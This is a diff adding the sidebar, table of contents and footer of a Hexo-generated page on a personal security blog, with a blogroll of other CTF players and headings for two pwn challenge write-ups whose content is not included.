+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="N0vice" />
+            
+              <p class="site-author-name" itemprop="name">N0vice</p>
+              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-babybabypwn"><span class="nav-number">1.</span> <span class="nav-text">0x01 babybabypwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-warm-up"><span class="nav-number">2.</span> <span class="nav-text">0x02  warm_up</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N0vice</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
